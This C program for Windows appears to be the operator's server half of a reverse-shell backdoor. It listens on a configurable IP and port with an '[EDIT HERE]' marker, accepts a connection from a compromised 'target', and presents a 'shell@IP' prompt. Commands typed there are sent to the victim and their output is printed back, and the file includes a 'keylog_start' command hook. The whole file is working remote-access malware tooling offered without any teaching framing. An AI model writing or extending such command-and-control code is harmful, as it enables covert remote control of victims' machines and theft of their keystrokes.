#include <stdio.h>      //standard input/output
#include <stdlib.h>     //standard utilities library
#include <winsock2.h>   //for Windows socket API
#include <ws2tcpip.h>   //for TCP/IP functions

#pragma comment(lib, "ws2_32.lib") //link with the Winsock library

//set host IP Address and Port [EDIT HERE]
char *ServIP = "127.0.0.1";
unsigned short ServPort = 5050;

//create connection, send command, receive response
int main()
{
    WSADATA wsaData;
    SOCKET sock, client_socket; //own socket and client socket
    char buffer[1024]; //store command from server
    char response[18384]; //store response
    struct sockaddr_in server_address, client_address; //create socket object

    int i = 0;
    int optval = 1;
    int client_length;

    //initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        printf("Failed to initialize Winsock.\n");
        return 1;
    }

    //define socket object
    sock = socket(AF_INET, SOCK_STREAM, 0);

    //socket setup error
    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (char *)&optval, sizeof(optval)) < 0)
    {
        printf("Error Setting TCP Socket Options!\n");
        return 1;
    }

    //setup server address
    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = inet_addr(ServIP); //set host IP
    server_address.sin_port = htons(ServPort); //set port

    //bind socket
    bind(sock, (struct sockaddr *)&server_address, sizeof(server_address));
    listen(sock, 5);
    client_length = sizeof(client_address);
    client_socket = accept(sock, (struct sockaddr *)&client_address, &client_length); //accept connection

    while (1)
    {
        memset(buffer, 0, sizeof(buffer));
        memset(response, 0, sizeof(response));

        printf("* shell@%s:~$ ", inet_ntoa(client_address.sin_addr)); //create shell feed
        fgets(buffer, sizeof(buffer), stdin); //get command and store in buffer
        strtok(buffer, "\n");
        send(client_socket, buffer, sizeof(buffer), 0); //send command to target

        //quit server with q command
        if (strncmp("q", buffer, 1) == 0)
        {
            break;
        }

        //change directory with cd command
        else if (strncmp("cd ", buffer, 3) == 0)
        {
            continue;
        }

        //implement keylogger
        else if (strncmp("keylog_start", buffer, 12) == 0)
        {
            continue;
        }

        //run any other command
        else
        {
            recv(client_socket, response, sizeof(response), 0);
            printf("%s", response);
        }
    }

    //cleanup
    closesocket(client_socket);
    closesocket(sock);
    WSACleanup();
    return 0;
}